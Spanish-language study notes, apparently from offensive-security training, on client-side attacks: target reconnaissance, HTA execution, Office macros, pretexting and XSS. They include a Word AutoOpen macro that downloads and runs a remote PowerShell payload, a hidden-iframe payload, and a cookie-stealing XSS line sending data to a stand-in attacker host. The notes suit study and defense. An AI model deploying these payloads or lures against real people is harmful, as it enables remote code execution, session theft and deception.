# Client-Side Attacks

Propietario: Adrian Gisbert Cabello

### 1. Introducción a los Ataques del Lado del Cliente

Los vectores de ataque del lado del cliente son especialmente insidiosos ya que explotan debilidades en el software del cliente, como un navegador, en lugar de explotar el software del servidor. A menudo implican alguna forma de interacción y engaño para que el software del cliente ejecute código malicioso .

### 2. Metodología para Conocer tu Objetivo

La clave para los ataques del lado del cliente radica en la recopilación precisa y completa de información. Se pueden usar técnicas tanto pasivas como activas para recopilar información sobre los objetivos de ataques del lado del cliente.

### 2.1. Recopilación de Información Pasiva

- **Búsqueda en Google y Redes Sociales**: Buscar direcciones IP corporativas, fotos de pantallas de computadoras en redes sociales, foros, etc.
- **Revisar Cadena de Agente de Usuario**: Buscar información en sitios que recopilan datos de agentes de usuario para identificar el sistema operativo y las versiones del navegador y complementos instalados .

### 2.2. Recopilación de Información Activa

- **Ingeniería Social**: Llamadas telefónicas o correos electrónicos dirigidos para obtener información sobre el sistema operativo, versiones de software, etc.
- **Fingerprinting del Cliente**: Utilizar bibliotecas como Fingerprintjs2 para identificar versiones del navegador y detalles del sistema operativo a través de un sitio web malicioso .

### 3. Leveraging HTML Applications (HTA)

- **Exploración de Aplicaciones HTML**: Las aplicaciones HTML permiten la ejecución de aplicaciones directamente desde Internet Explorer utilizando `mshta.exe`, lo que permite ejecutar código arbitrario con los permisos del usuario.Esta técnica aprovecha tecnologías web legadas de Microsoft como ActiveX .
    
    ```html
    <script>
      var shell = new ActiveXObject("WScript.Shell");
      shell.run("cmd.exe");
    </script>
    ```
    

### 4. Explotación de Microsoft Office

- **Macros de Microsoft Word**:
    - Crear un documento de Word con una macro maliciosa que ejecute un payload de PowerShell para abrir un shell inverso.
    
    ```
    Sub AutoOpen()
      Dim objShell As Object
      Set objShell = CreateObject("WScript.Shell")
      objShell.Run "powershell -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://malicious.server/payload.ps1')"
    End Sub
    ```
    
- **OLE (Object Linking and Embedding)**: Insertar objetos OLE maliciosos en documentos de Office para ejecutar código arbitrario.
- **Evasión de Vista Protegida**: Configurar el documento para que sea confiable o instruir al usuario a desactivar la vista protegida .

### 5. Ataques de Ingeniería Social

- **Pretexting**: Crear un pretexto convincente para obtener información específica del usuario objetivo, como versiones de software y configuraciones de seguridad, a través de interacciones aparentemente legítimas.
    - Ejemplo: Enviar un currículum malformado que no se pueda abrir y luego solicitar detalles del software para "solucionar" el problema .

### 6. Ataques Basados en Navegador

### 6.1. Cross-Site Scripting (XSS)

- **Identificación de XSS**:
    - Examinar los campos de entrada y observar si aceptan datos no saneados que se reflejan en la salida.
    - Probar con caracteres especiales (`<`, `>`, `"`, `'`, `{`, `}`, `;`).
- **Payload Básico de XSS**:
    
    ```html
    <script>alert('XSS')</script>
    ```
    
- **Uso de iframes Invisibles**:
    
    ```html
    <iframe src="http://malicious.server/payload" height="0" width="0"></iframe>
    ```
    
- **Robo de Cookies y Sesiones**:Estos ataques pueden incluir el secuestro de sesiones, redirección forzada a páginas maliciosas y ejecución de aplicaciones locales como el usuario .
    
    ```html
    <script>
      document.write('<img src="http://attacker.server/steal?cookie=' + document.cookie + '" />');
    </script>
    ```
    

### 7. Herramientas Adicionales

- **BeEF (Browser Exploitation Framework)**: Herramienta de explotación que puede usar vulnerabilidades XSS para lanzar ataques del lado del cliente.URL de la interfaz de BeEF: `http://127.0.0.1:3000/ui/panel` .
    
    ```bash
    sudo beef-xss
    ```